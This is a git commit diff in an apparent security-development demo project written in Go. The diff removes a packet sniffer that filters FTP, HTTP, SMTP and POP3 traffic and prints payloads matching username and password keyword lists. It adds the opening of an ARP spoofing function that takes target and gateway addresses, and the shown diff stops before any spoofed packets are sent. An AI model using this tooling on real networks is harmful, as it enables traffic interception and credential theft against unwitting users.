0c063494391abf5c200d6130c7a6ef2ee568f379
SemperFirst <373052423@qq.com>
2025-08-08 15:10:43 +0800

    update

--- sniffer/arp_sniff_demo/arpspoof/arp.go
+++ sniffer/arp_sniff_demo/arpspoof/arp.go
@@ -1,99 +1,54 @@
-package sniff
+package arpspoof
 
 import (
 	"bytes"
-	"fmt"
-	"strings"
-
+	"encoding/binary"
+	"net"
+	"os"
+	"os/signal"
+	"time"
+	"github.com/malfunkt/arpfox/arp"
+	"github.com/malfunkt/iprange"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-
-	"sec-dev-in-action-src/sniffer/arp_sniff_demo/logger"
+	"SafeDp/sniffer/arp_sniff_demo/logger"
 )
 
-var (
-	filter   = "(tcp and dst port 21) or  (tcp and dst port 80) or (tcp and dst port 25) or (tcp and dst port 110)"
-	userList = []string{"user", "username", "login", "login_user", "manager", "user_name", "usr"}
-	passList = []string{"pass", "password", "login_pass", "pwd", "passwd"}
-)
-
-func StartSniff(handle *pcap.Handle) error {
-	err := handle.SetBPFFilter(filter)
+func ArpSpoof(DeviceName string, handle *pcap.Handle, target, gateway string) {
+	iFace, err := net.InterfaceByName(DeviceName);
+	if err != nil {
+		logger.Log.Fatalf("Could not use interface %s: %v", DeviceName, err)
+	}
+	var iFaceAddr *net.IPNet
+	iFaceAddrs, err := iFace.Addrs()
 	if err != nil {
 		logger.Log.Fatal(err)
 	}
 
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {
-		processPacket(packet)
-	}
-
-	return err
-}
-
-func processPacket(packet gopacket.Packet) {
-	var (
-		fromIp   string
-		destIp   string
-		srcPort  string
-		destPort string
-	)
-
-	ipLayer := packet.Layer(layers.LayerTypeIPv4)
-	if ipLayer != nil {
-		ip, _ := ipLayer.(*layers.IPv4)
-		fromIp = ip.SrcIP.String()
-		destIp = ip.DstIP.String()
-	}
-
-	tcpLayer := packet.Layer(layers.LayerTypeTCP)
-	if tcpLayer != nil {
-		tcp, _ := tcpLayer.(*layers.TCP)
-		srcPort = tcp.SrcPort.String()
-		destPort = tcp.DstPort.String()
-	}
-
-	applicationLayer := packet.ApplicationLayer()
-	if applicationLayer != nil {
-		payload := applicationLayer.Payload()
-		if user, ok := checkUsername(payload); ok {
-			_ = user
-			fmt.Printf("%v:%v->%v:%v, %v\n", fromIp, srcPort, destIp, destPort, string(payload))
-		}
-		if pass, ok := checkPassword(payload); ok {
-			_ = pass
-			fmt.Printf("%v:%v->%v:%v, %v\n", fromIp, srcPort, destIp, destPort, string(payload))
-		}
-	}
-}
-
-func checkUsername(payload []byte) (string, bool) {
-	field := ""
-	result := false
-	for _, u := range userList {
-		payload = []byte(strings.ToLower(string(payload)))
-		if bytes.Contains(payload, []byte(strings.ToLower(u))) {
-			field = u
-			result = true
+	for _, addr := range iFaceAddrs {
+		if ipnet, ok := addr.(*net.IPNet); ok {
+			if ip4 := ipnet.IP.To4(); ip4 != nil {
+				iFaceAddr = &net.IPNet{
+					IP: ip4,
+					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
+			}
 			break
 		}
 	}
-
-	return field, result
-}
-
-func checkPassword(payload []byte) (string, bool) {
-	field := ""
-	result := false
-	for _, p := range passList {
-		payload = []byte(strings.ToLower(string(payload)))
-		if bytes.Contains(payload, []byte(strings.ToLower(p))) {
-			field = p
-			result = true
-			break
-		}
+	if iFaceAddr == nil {
+		logger.Log.Fatalf("No IPv4 address found for interface %s", DeviceName)
 	}
 
-	return field, result
-}
+	var targetAddrs []net.IP
+	if target != "" {
+		addrRange, err := iprange.ParseList(target)
+		if err != nil {
+			logger.Log.Fatal("Wrong format for target.")
+		}
+		targetAddrs = addrRange.Expand()
+		if len(targetAddrs) == 0 {
+			logger.Log.Fatal("No valid targets given.")
+		}
+	}
+	gatewayAddr := net.ParseIP(gateway).To4()
